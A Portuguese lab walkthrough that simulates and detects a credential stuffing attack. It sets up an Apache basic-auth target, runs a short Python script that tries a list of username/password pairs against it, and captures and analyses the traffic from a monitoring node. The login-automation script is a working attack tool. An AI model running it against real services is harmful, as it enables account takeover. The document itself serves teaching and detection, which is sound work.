# CREDENTIAL STUFFING \- FLUXO FINAL

Simular e identificar um ataque de Credential Stuffing em um ambiente controlado, capturando e analisando o tráfego gerado por tentativas de login automatizadas.

### Topologia da rede \- principais utilizados

* Mostre os principais nós:  
  * **outside1** (atacante)  
  * **server1** (alvo)  
  * **ids1** (monitoramento)

## TERMINAL 1: server1 (Servidor alvo)

**1\. Instalar Apache e configurar autenticação:**  
\------------------------------------------------  
apt update  
apt install apache2 apache2-utils \-y

**2\. Criar usuário e senha protegida:**  
\------------------------------------------------  
htpasswd \-cb /etc/apache2/.htpasswd usuario1 senhacerta

**3\. Criar página protegida:**  
\------------------------------------------------  
echo '\<html\>\<body\>\<h1\>Bem-vindo ao server1 protegido\</h1\>\</body\>\</html\>' \> /var/www/html/index.html

**4\. Habilitar autenticação:**  
\------------------------------------------------  
cat \> /etc/apache2/sites-enabled/000-default.conf \<\< EOF  
\<Directory "/var/www/html"\>  
AuthType Basic  
AuthName "Área restrita"  
AuthUserFile /etc/apache2/.htpasswd  
Require valid-user  
\</Directory\>  
EOF

**5\. Reiniciar Apache e obter IP:**  
\------------------------------------------------  
service apache2 restart  
ip a | grep inet

## TERMINAL 2: outside1 (Atacante)

**1\. Criar ambiente e script de ataque:**  
\------------------------------------------------  
ip netns exec mgmt python3 \-m venv /root/credstuff\_venv  
ip netns exec mgmt bash \-c "source /root/credstuff\_venv/bin/activate && pip install requests"

cat \> /root/credstuff.py \<\< 'EOF'  
import requests  
from requests.auth import HTTPBasicAuth

url \= "http://\<IP\_DO\_SERVER1\>"

credenciais \= \[  
    ("usuario1", "senhaerrada"),  
    ("usuario1", "outrasenha"),  
    ("usuario1", "senhacerta")  
\]

for usuario, senha in credenciais:  
    r \= requests.get(url, auth=HTTPBasicAuth(usuario, senha))  
    print(f"Tentativa {usuario}:{senha} \-\> {r.status\_code}")  
EOF

(Substitua \<IP\_DO\_SERVER1\> pelo IP real)

**2\. Executar o ataque:**  
\------------------------------------------------  
/root/credstuff\_venv/bin/python /root/credstuff.py

## TERMINAL 3: ids1 (Monitoramento)

**1\. Capturar tráfego durante o ataque:**  
\------------------------------------------------  
tcpdump \-i ids1-eth0 \-w /tmp/ataque\_credential\_stuffing.pcap

**2\. Após o ataque, parar com CTRL+C**

## Análise dos resultados no ids1

**1\. Instalar script de análise:**  
\------------------------------------------------  
cat \> /root/analisar\_credential\_stuffing.sh \<\< 'EOF'  
\#\!/bin/bash

PCAP="/tmp/ataque\_credential\_stuffing.pcap"

if \[ \! \-f "$PCAP" \]; then  
  echo "Arquivo de captura $PCAP não encontrado\!"  
  exit 1  
fi

echo "📄 Analisando arquivo: $PCAP"  
echo  
echo "Tentativas de login HTTP detectadas:"  
echo "-------------------------------------"

tcpdump \-nn \-A \-r "$PCAP" | awk '  
  /HTTP\\/1.1/ {  
    split($0, a, " ")  
    code \= a\[2\]  
    if (code \== "401")  
      status \= "❌ Falha (401 Unauthorized)"  
    else if (code \== "200")  
      status \= "✅ Sucesso (200 OK)"  
    else  
      status \= "ℹ Outro código: " code

    getline; getline  
    split($0, parts, " ")  
    ip \= parts\[1\]  
    time \= strftime("%H:%M:%S")  
    print time " | IP: " ip " → " status  
  }  
'  
echo  
echo "📌 Explicação:"  
echo " \- 401: tentativa com senha incorreta"  
echo " \- 200: login com senha correta (acesso obtido)"  
echo  
echo "✅ Use isso como evidência clara de Credential Stuffing automatizado."  
EOF

**2\. Executar o script:**  
\------------------------------------------------  
chmod \+x /root/analisar\_credential\_stuffing.sh  
/root/analisar\_credential\_stuffing.sh

## INTERPRETAÇÃO

\- 401 Unauthorized → tentativa de senha errada  
\- 200 OK → login bem-sucedido  
\- As respostas foram capturadas em sequência, validando que o ataque automatizado ocorreu com sucesso.  
\- Mostra que uma das credenciais testadas era válida — exatamente como ocorre em ataques reais.

##  CONCLUSÃO

O experimento demonstrou:  
\- Como ataques de Credential Stuffing funcionam  
\- Como detectar e analisar tentativas em rede real  
\- A importância de MFA, rate-limiting e políticas de senha forte  
